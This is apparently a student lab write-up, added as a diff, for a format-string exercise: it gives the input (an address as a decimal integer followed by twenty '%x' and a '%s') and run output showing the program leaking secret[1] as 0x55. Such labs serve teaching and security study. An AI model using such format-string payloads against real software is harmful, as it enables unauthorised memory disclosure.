@@ -1,0 +1,33 @@
+Task 5.2 Summary
+================
+
+Goal:
+Read the value of `secret[1]` from memory.
+
+Known runtime address:
+- `secret[1] = 0x40804044`
+- Decimal form used for `int_input` = `1082146884`
+
+Input used:
+$ sed -n '1,10p' ../task02_input.txt
+1082146884
+%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s
+
+How it works:
+- The first 20 `%x` conversions consume stack arguments 1 through 20.
+- The final `%s` uses stack argument 21, which is `int_input`.
+- `int_input` contains `0x40804044`, the address of `secret[1]`.
+- The value at that address is `0x00000055`, whose first byte is ASCII `U`.
+- Therefore `%s` prints `U`, proving that `secret[1] = 0x55`.
+
+Observed result:
+$ sed -n '1,20p' task02_run.txt
+The variable secret's address is 0x40800d38 (on stack)
+The variable secret's value is 0x40804040 (on heap)
+secret[0]'s address is 0x40804040 (on heap)
+secret[1]'s address is 0x40804044 (on heap)
+Please enter a decimal integer
+Please enter a string
+40800d3c.40800eff.0.0.0.0.0.0.40804040.40804044.40804044.40804040.40804044.40804044.40804040.0.0.0.0.0.U
+The original secrets: 0x44 -- 0x55
+The new secrets: 0x44 -- 0x55
